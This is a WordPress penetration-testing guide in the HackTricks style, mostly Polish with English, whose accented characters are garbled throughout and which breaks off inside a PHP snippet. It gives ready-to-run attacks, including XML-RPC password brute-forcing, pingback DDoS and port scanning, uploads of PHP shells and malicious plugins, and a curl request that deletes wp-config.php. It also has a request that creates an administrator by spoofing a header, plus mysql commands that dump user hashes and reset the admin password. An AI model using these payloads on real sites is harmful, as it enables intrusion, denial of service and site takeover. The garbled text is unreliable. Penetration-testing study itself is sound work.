# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- In **wp-config.php** you can find the root password of the database.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` contains useful information such as the version WordPress installed.
- `wp-activate.php` is used for the email activation process when setting up a new WordPress site.
- Login folders (may be renamed to hide it):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- The `wp-content` folder is the main directory where plugins and themes are stored.
- `wp-content/uploads/` Is the directory where any files uploaded to the platform are stored.
- `wp-includes/` This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.
- `wp-sitemap.xml` In Wordpress versions 5.5 and greater, Worpress generates a sitemap XML file with all public posts and publicly queryable post types and taxonomies.

**Post exploitation**

- The `wp-config.php` file contains information required by WordPress to connect to the database such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.

### Users Permissions

- **Administrator**
- **Editor**: Publish and manages his and others posts
- **Author**: Publish and manage his own posts
- **Contributor**: Write and manage his posts but cannot publish them
- **Subscriber**: Browser posts and edit their profile

## **Passive Enumeration**

### **Get WordPress version**

Check if you can find the files `/license.txt` or `/readme.html`

Inside the **source code** of the page (example from [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Pliki linkÃ³w CSS

![](<../../images/image (533).png>)

- Pliki JavaScript

![](<../../images/image (524).png>)

### Pobierz wtyczki
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pobieranie motywÃ³w
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### OgÃ³lne wyodrÄ™bnianie wersji
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktywna enumeracja

### Wtyczki i motywy

Prawdopodobnie nie bÄ™dziesz w stanie znaleÅºÄ‡ wszystkich dostÄ™pnych wtyczek i motywÃ³w. Aby odkryÄ‡ je wszystkie, bÄ™dziesz musiaÅ‚ **aktywnie przeprowadziÄ‡ Brute Force listy wtyczek i motywÃ³w** (miejmy nadziejÄ™, Å¼e istniejÄ… zautomatyzowane narzÄ™dzia zawierajÄ…ce te listy).

### UÅ¼ytkownicy

- **ID Brute:** Uzyskujesz prawidÅ‚owych uÅ¼ytkownikÃ³w z serwisu WordPress przez Brute Forcing ID uÅ¼ytkownikÃ³w:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
JeÅ›li odpowiedzi to **200** lub **30X**, oznacza to, Å¼e id jest **prawidÅ‚owe**. JeÅ›li odpowiedÅº to **400**, to id jest **nieprawidÅ‚owe**.

- **wp-json:** MoÅ¼esz teÅ¼ sprÃ³bowaÄ‡ uzyskaÄ‡ informacje o uÅ¼ytkownikach, zapytujÄ…c:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Kolejny endpoint `/wp-json/`, ktÃ³ry moÅ¼e ujawniÄ‡ pewne informacje o uÅ¼ytkownikach, to:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ZauwaÅ¼, Å¼e ten endpoint ujawnia tylko uÅ¼ytkownikÃ³w, ktÃ³rzy opublikowali post. **Dostarczone zostanÄ… tylko informacje o uÅ¼ytkownikach, ktÃ³rzy majÄ… tÄ™ funkcjÄ™ wÅ‚Ä…czonÄ…**.

RÃ³wnieÅ¼ zwrÃ³Ä‡ uwagÄ™, Å¼e **/wp-json/wp/v2/pages** moÅ¼e leak IP addresses.

- **Login username enumeration**: Podczas logowania w **`/wp-login.php`** komunikat jest inny i wskazuje, czy nazwa uÅ¼ytkownika istnieje, czy nie.

### XML-RPC

JeÅ›li `xml-rpc.php` jest aktywny moÅ¼esz wykonaÄ‡ credentials brute-force lub uÅ¼yÄ‡ go do uruchomienia DoS attacks na inne zasoby. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Aby sprawdziÄ‡, czy jest aktywny, sprÃ³buj uzyskaÄ‡ dostÄ™p do _**/xmlrpc.php**_ i wyÅ›lij to Å¼Ä…danie:

**SprawdÅº**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** to przykÅ‚adowe metody, ktÃ³re moÅ¼na uÅ¼yÄ‡ do brute-force credentials. JeÅ›li znajdziesz ktÃ³rÄ…kolwiek z nich, moÅ¼esz wysÅ‚aÄ‡ coÅ› takiego:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Komunikat _"NieprawidÅ‚owa nazwa uÅ¼ytkownika lub hasÅ‚o"_ w odpowiedzi z kodem 200 powinien pojawiÄ‡ siÄ™, jeÅ›li dane uwierzytelniajÄ…ce sÄ… nieprawidÅ‚owe.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

UÅ¼ywajÄ…c prawidÅ‚owych danych uwierzytelniajÄ…cych moÅ¼esz przesÅ‚aÄ‡ plik. W odpowiedzi pojawi siÄ™ Å›cieÅ¼ka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

This method is meant for programs and not for humans, and old, therefore it doesn't support 2FA. So, if you have valid creds but the main entrance is protected by 2FA, **you might be able to abuse xmlrpc.php to login with those creds bypassing 2FA**. Note that you won't be able to perform all the actions you can do through the console, but you might still be able to get to RCE as Ippsec explains it in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

JeÅ›li otrzymasz **faultCode** z wartoÅ›ciÄ… **wiÄ™kszÄ…** niÅ¼ **0** (17), oznacza to, Å¼e port jest otwarty.

Zobacz uÅ¼ycie **`system.multicall`** w poprzedniej sekcji, aby dowiedzieÄ‡ siÄ™, jak naduÅ¼yÄ‡ tej metody, aby wywoÅ‚aÄ‡ DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ten plik zwykle znajduje siÄ™ w katalogu root strony Wordpress: **`/wp-cron.php`**\
Gdy ten plik jest **wywoÅ‚ywany**, wykonywane jest "**ciÄ™Å¼kie**" zapytanie MySQL, wiÄ™c moÅ¼e byÄ‡ wykorzystany przez **atakujÄ…cych** do **spowodowania** **DoS**.\
DomyÅ›lnie `wp-cron.php` jest wywoÅ‚ywany przy kaÅ¼dym Å‚adowaniu strony (za kaÅ¼dym razem, gdy klient Å¼Ä…da dowolnej strony Wordpress), co na serwisach o duÅ¼ym ruchu moÅ¼e powodowaÄ‡ problemy (DoS).

Zaleca siÄ™ wyÅ‚Ä…czyÄ‡ Wp-Cron i utworzyÄ‡ rzeczywisty cronjob na hoÅ›cie, ktÃ³ry bÄ™dzie wykonywaÅ‚ potrzebne dziaÅ‚ania w regularnych odstÄ™pach (bez powodowania problemÃ³w).

### /wp-json/oembed/1.0/proxy - SSRF

SprÃ³buj uzyskaÄ‡ dostÄ™p do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i strona Wordpress moÅ¼e wykonaÄ‡ Å¼Ä…danie do Ciebie.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

To narzÄ™dzie sprawdza, czy istnieje **methodName: pingback.ping** oraz Å›cieÅ¼ka **/wp-json/oembed/1.0/proxy**, i jeÅ›li tak, prÃ³buje je wykorzystaÄ‡.

## NarzÄ™dzia automatyczne
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Uzyskanie dostÄ™pu przez nadpisanie jednego bitu

To bardziej ciekawostka niÅ¼ rzeczywisty atak. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) moÅ¼na byÅ‚o zmieniÄ‡ 1 bit w dowolnym pliku wordpress. DziÄ™ki temu moÅ¼na byÅ‚o zmieniÄ‡ pozycjÄ™ `5389` w pliku `/var/www/html/wp-includes/user.php`, aby zamieniÄ‡ operacjÄ™ NOT (`!`) na NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikacja pliku php w uÅ¼ywanym motywie (admin credentials needed)**

WyglÄ…d â†’ Edytor motywu â†’ Szablon 404 (po prawej)

ZmieÅ„ zawartoÅ›Ä‡ na php shell:

![](<../../images/image (384).png>)

Wyszukaj w internecie, jak uzyskaÄ‡ dostÄ™p do zaktualizowanej strony. W tym przypadku musisz wejÅ›Ä‡ tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¼esz uÅ¼yÄ‡:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

MoÅ¼e byÄ‡ moÅ¼liwe wgranie plikÃ³w .php jako plugin.\
UtwÃ³rz swÃ³j php backdoor uÅ¼ywajÄ…c na przykÅ‚ad:

![](<../../images/image (183).png>)

NastÄ™pnie dodaj nowy plugin:

![](<../../images/image (722).png>)

Wgraj plugin i naciÅ›nij Install Now:

![](<../../images/image (249).png>)

Kliknij na Procced:

![](<../../images/image (70).png>)

Prawdopodobnie na pierwszy rzut oka nic siÄ™ nie stanie, ale jeÅ›li przejdziesz do Media, zobaczysz swÃ³j shell wgrany:

![](<../../images/image (462).png>)

OtwÃ³rz go, a zobaczysz URL do wykonania reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ta metoda polega na instalacji zÅ‚oÅ›liwego pluginu znanego jako podatny, ktÃ³ry moÅ¼na wykorzystaÄ‡ do uzyskania web shell. Proces ten wykonywany jest przez dashboard WordPressa w nastÄ™pujÄ…cy sposÃ³b:

1. **Plugin Acquisition**: Plugin jest pobierany ze ÅºrÃ³dÅ‚a takiego jak Exploit DB jak [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- PrzejdÅº do dashboardu WordPress, nastÄ™pnie do `Dashboard > Plugins > Upload Plugin`.
- Wgraj plik zip pobranego pluginu.
3. **Plugin Activation**: Po pomyÅ›lnym zainstalowaniu plugin musi zostaÄ‡ aktywowany przez dashboard.
4. **Exploitation**:
- Po zainstalowaniu i aktywowaniu pluginu "reflex-gallery" moÅ¼na go wykorzystaÄ‡, gdyÅ¼ jest znany jako podatny.
- Metasploit framework zawiera exploit dla tej podatnoÅ›ci. ÅadujÄ…c odpowiedni moduÅ‚ i wykonujÄ…c konkretne polecenia moÅ¼na uzyskaÄ‡ sesjÄ™ meterpreter, dajÄ…cÄ… nieautoryzowany dostÄ™p do strony.
- NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e jest to tylko jedna z wielu metod wykorzystania strony WordPress.

TreÅ›Ä‡ zawiera ilustracje przedstawiajÄ…ce kroki w dashboardzie WordPress dotyczÄ…ce instalacji i aktywacji pluginu. NaleÅ¼y jednak pamiÄ™taÄ‡, Å¼e wykorzystywanie podatnoÅ›ci w ten sposÃ³b jest nielegalne i nieetyczne bez odpowiedniej autoryzacji. Informacje te powinny byÄ‡ wykorzystywane odpowiedzialnie i tylko w kontekÅ›cie prawnym, takim jak penetration testing z wyraÅºnym pozwoleniem.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Tworzy uÅ¼ytkownika w WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Wgraj swÃ³j custom plugin (backdoor) do WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edytuje wbudowane pluginy w WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edytuje wbudowane motywy w WordPress.
- _**(Custom) Custom Exploits:**_ WÅ‚asne exploity dla third-party WordPress Plugins/Themes.

## Post Exploitation

WyodrÄ™bnij nazwy uÅ¼ytkownikÃ³w i hasÅ‚a:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ZmieÅ„ hasÅ‚o administratora:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest wtyczek Wordpress

### Powierzchnia ataku

ZnajomoÅ›Ä‡ tego, w jaki sposÃ³b wtyczka Wordpress moÅ¼e udostÄ™pniaÄ‡ funkcjonalnoÅ›Ä‡, jest kluczowa do znajdowania podatnoÅ›ci w tej funkcjonalnoÅ›ci. MoÅ¼esz zobaczyÄ‡, jak wtyczka moÅ¼e wystawiaÄ‡ funkcjonalnoÅ›Ä‡ w poniÅ¼szych punktach oraz przykÅ‚ady podatnych wtyczek w [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jednym ze sposobÃ³w, w jaki wtyczka moÅ¼e udostÄ™pniaÄ‡ funkcje uÅ¼ytkownikom, sÄ… obsÅ‚ugiwacze AJAX. MogÄ… one zawieraÄ‡ bÅ‚Ä™dy w logice, autoryzacji lub uwierzytelnianiu. Co wiÄ™cej, doÅ›Ä‡ czÄ™sto te funkcje bÄ™dÄ… opieraÄ‡ zarÃ³wno uwierzytelnianie, jak i autoryzacjÄ™ na istnieniu Wordpress nonce, ktÃ³ry **kaÅ¼dy uwierzytelniony uÅ¼ytkownik w instancji Wordpress moÅ¼e posiadaÄ‡** (niezaleÅ¼nie od roli).

Oto funkcje, ktÃ³re mogÄ… byÄ‡ uÅ¼yte do wystawienia funkcji w wtyczce:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**UÅ¼ycie `nopriv` sprawia, Å¼e endpoint jest dostÄ™pny dla wszystkich uÅ¼ytkownikÃ³w (nawet niezalogowanych).**

> [!CAUTION]
> Co wiÄ™cej, jeÅ›li funkcja sprawdza autoryzacjÄ™ uÅ¼ytkownika tylko za pomocÄ… funkcji `wp_verify_nonce`, to funkcja ta jedynie weryfikuje, czy uÅ¼ytkownik jest zalogowany â€” zwykle nie sprawdza roli uÅ¼ytkownika. W efekcie uÅ¼ytkownicy o niskich uprawnieniach mogÄ… mieÄ‡ dostÄ™p do akcji wymagajÄ…cych wysokich uprawnieÅ„.

- **REST API**

MoÅ¼liwe jest takÅ¼e wystawienie funkcji z wordpress poprzez zarejestrowanie REST API za pomocÄ… funkcji `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` jest callbackiem do funkcji, ktÃ³ra sprawdza, czy dany uÅ¼ytkownik jest autoryzowany do wywoÅ‚ania metody API.

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **Direct access to the php file**

OczywiÅ›cie, Wordpress uÅ¼ywa PHP i pliki wewnÄ…trz wtyczek sÄ… bezpoÅ›rednio dostÄ™pne z sieci. Zatem, jeÅ›li wtyczka ujawnia jakÄ…kolwiek podatnÄ… funkcjonalnoÅ›Ä‡, ktÃ³ra jest wywoÅ‚ywana jedynie przez dostÄ™p do pliku, bÄ™dzie ona moÅ¼liwa do wykorzystania przez dowolnego uÅ¼ytkownika.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

NiektÃ³re wtyczki implementujÄ… skrÃ³ty â€œtrusted headerâ€ dla integracji wewnÄ™trznych lub reverse proxies i nastÄ™pnie uÅ¼ywajÄ… tego nagÅ‚Ã³wka do ustawienia kontekstu bieÅ¼Ä…cego uÅ¼ytkownika dla Å¼Ä…daÅ„ REST. JeÅ›li nagÅ‚Ã³wek nie jest kryptograficznie powiÄ…zany z Å¼Ä…daniem przez komponent upstream, atakujÄ…cy moÅ¼e go sfaÅ‚szowaÄ‡ i trafiÄ‡ na uprzywilejowane REST routes jako administrator.

- Impact: eskalacja uprawnieÅ„ bez uwierzytelnienia do administratora poprzez utworzenie nowego administratora za pomocÄ… core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (wymusza ID uÅ¼ytkownika 1, zazwyczaj pierwsze konto administratora).
- Exploited route: `POST /wp-json/wp/v2/users` with an elevated role array.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Dlaczego to dziaÅ‚a

- Wtyczka mapuje kontrolowany przez klienta nagÅ‚Ã³wek na stan uwierzytelnienia i pomija sprawdzenia uprawnieÅ„.
- WordPress core oczekuje uprawnienia `create_users` dla tej trasy; exploit wtyczki omija to, ustawiajÄ…c bezpoÅ›rednio kontekst bieÅ¼Ä…cego uÅ¼ytkownika na podstawie nagÅ‚Ã³wka.

Oczekiwane wskaÅºniki powodzenia

- HTTP 201 z ciaÅ‚em JSON opisujÄ…cym utworzonego uÅ¼ytkownika.
- Nowy uÅ¼ytkownik administratora widoczny w `wp-admin/users.php`.

Lista kontrolna wykrywania

- Grepuj pod kÄ…tem `getallheaders()`, `$_SERVER['HTTP_...']` lub vendor SDKs, ktÃ³re odczytujÄ… niestandardowe nagÅ‚Ã³wki w celu ustawienia kontekstu uÅ¼ytkownika (np. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Przejrzyj rejestracje REST pod kÄ…tem uprzywilejowanych callbackÃ³w, ktÃ³re nie majÄ… solidnych sprawdzeÅ„ `permission_callback` i zamiast tego polegajÄ… na nagÅ‚Ã³wkach Å¼Ä…dania.
- Szukaj uÅ¼yÄ‡ funkcji zarzÄ…dzania uÅ¼ytkownikami core (`wp_insert_user`, `wp_create_user`) wewnÄ…trz handlerÃ³w REST, ktÃ³re sÄ… zabezpieczone jedynie przez wartoÅ›ci nagÅ‚Ã³wkÃ³w.

### Nieuwierzytelnione dowolne usuwanie plikÃ³w przez wp_ajax_nopriv (Litho Theme <= 3.0)

Motywy i wtyczki WordPress czÄ™sto udostÄ™pniajÄ… handlery AJAX przez hooki `wp_ajax_` i `wp_ajax_nopriv_`. Gdy uÅ¼yta jest wariant **_nopriv_**, **callback staje siÄ™ dostÄ™pny dla niezalogowanych odwiedzajÄ…cych**, wiÄ™c kaÅ¼da wraÅ¼liwa akcja musi dodatkowo zaimplementowaÄ‡:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

Motyw Litho multipurpose (< 3.1) pominÄ…Å‚ te 3 kontrole w funkcji *Remove Font Family* i finalnie dostarczyÅ‚ nastÄ™pujÄ…cy kod (uproszczony):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemy wprowadzone przez ten fragment:

* **DostÄ™p bez uwierzytelnienia** â€“ hook `wp_ajax_nopriv_` jest zarejestrowany.
* **Brak sprawdzenia nonce / uprawnieÅ„** â€“ kaÅ¼dy odwiedzajÄ…cy moÅ¼e wywoÅ‚aÄ‡ punkt koÅ„cowy.
* **Brak sanitizacji Å›cieÅ¼ki** â€“ kontrolowany przez uÅ¼ytkownika `fontfamily` ciÄ…g jest konkatenowany do Å›cieÅ¼ki systemu plikÃ³w bez filtrowania, co pozwala na klasyczne `../../` traversal.

#### Eksploatacja

AtakujÄ…cy moÅ¼e usunÄ…Ä‡ dowolny plik lub katalog **poniÅ¼ej katalogu bazowego uploads** (zwykle `<wp-root>/wp-content/uploads/`) wysyÅ‚ajÄ…c jedno Å¼Ä…danie HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Lista kontrolna wykrywania

* KaÅ¼dy callback `add_action( 'wp_ajax_nopriv_...')`, ktÃ³ry wywoÅ‚uje pomocnicze funkcje systemu plikÃ³w (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itd.).
* Konkatenacja niesanitizowanych danych wejÅ›ciowych od uÅ¼ytkownika w Å›cieÅ¼ki (szukaj `$_POST`, `$_GET`, `$_REQUEST`).
* Brak `check_ajax_referer()` oraz `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation przez przywracanie przestarzaÅ‚ych rÃ³l i brak autoryzacji (ASE "View Admin as Role")

Wiele wtyczek implementuje funkcjÄ™ "view as role" lub tymczasowego przeÅ‚Ä…czania rÃ³l, zapisujÄ…c oryginalne role w user meta, aby moÅ¼na je byÅ‚o pÃ³Åºniej przywrÃ³ciÄ‡. JeÅ›li Å›cieÅ¼ka przywracania opiera siÄ™ tylko na parametrach Å¼Ä…dania (np. `$_REQUEST['reset-for']`) i liÅ›cie utrzymywanej przez wtyczkÄ™ bez sprawdzania uprawnieÅ„ oraz waÅ¼nego nonce, staje siÄ™ to vertical privilege escalation.

PrzykÅ‚ad z rzeczywistego Å›wiata znaleziono w wtyczce Admin and Site Enhancements (ASE) (â‰¤ 7.6.2.1). GaÅ‚Ä…Åº resetujÄ…ca przywracaÅ‚a role na podstawie `reset-for=<username>` jeÅ›li nazwa uÅ¼ytkownika pojawiaÅ‚a siÄ™ w wewnÄ™trznej tablicy `$options['viewing_admin_as_role_are']`, ale nie wykonywaÅ‚a ani sprawdzenia `current_user_can()` ani weryfikacji nonce przed usuniÄ™ciem bieÅ¼Ä…cych rÃ³l i ponownym dodaniem zapisanych rÃ³l z user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Dlaczego jest to eksploatowalne

- UfajÄ…c `$_REQUEST['reset-for']` i plugin option bez autoryzacji po stronie serwera.
- JeÅ›li uÅ¼ytkownik wczeÅ›niej miaÅ‚ wyÅ¼sze uprawnienia zapisane w `_asenha_view_admin_as_original_roles` i zostaÅ‚ zdegradowany, moÅ¼e je przywrÃ³ciÄ‡, korzystajÄ…c ze Å›cieÅ¼ki resetowania.
- W niektÃ³rych wdroÅ¼eniach kaÅ¼dy uwierzytelniony uÅ¼ytkownik mÃ³gÅ‚by wywoÅ‚aÄ‡ reset dla innej nazwy uÅ¼ytkownika wciÄ…Å¼ obecnej w `viewing_admin_as_role_are` (bÅ‚Ä™dna autoryzacja).

Eksploatacja (przykÅ‚ad)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
W podatnych buildach usuwa to bieÅ¼Ä…ce role i ponownie dodaje zapisane oryginalne role (np. `administrator`), effectively escalating privileges.

Detection checklist

- Szukaj funkcji przeÅ‚Ä…czania rÃ³l, ktÃ³re zapisujÄ… â€œoriginal rolesâ€ w user meta (np. `_asenha_view_admin_as_original_roles`).
- Zidentyfikuj Å›cieÅ¼ki resetowania/przywracania, ktÃ³re:
- OdczytujÄ… nazwy uÅ¼ytkownikÃ³w z `$_REQUEST` / `$_GET` / `$_POST`.
- ModyfikujÄ… role za pomocÄ… `add_role()` / `remove_role()` bez `current_user_can()` oraz `wp_verify_nonce()` / `check_admin_referer()`.
- AutoryzujÄ… na podstawie tablicy opcji wtyczki (np. `viewing_admin_as_role_are`) zamiast uprawnieÅ„ aktora.

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

Some plugins wire user-switching helpers to the public `init` hook and derive identity from a client-controlled cookie. If the code calls `wp_set_auth_cookie()` without verifying authentication, capability and a valid nonce, any unauthenticated visitor can force login as an arbitrary user ID.

Typical vulnerable pattern (simplified from Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

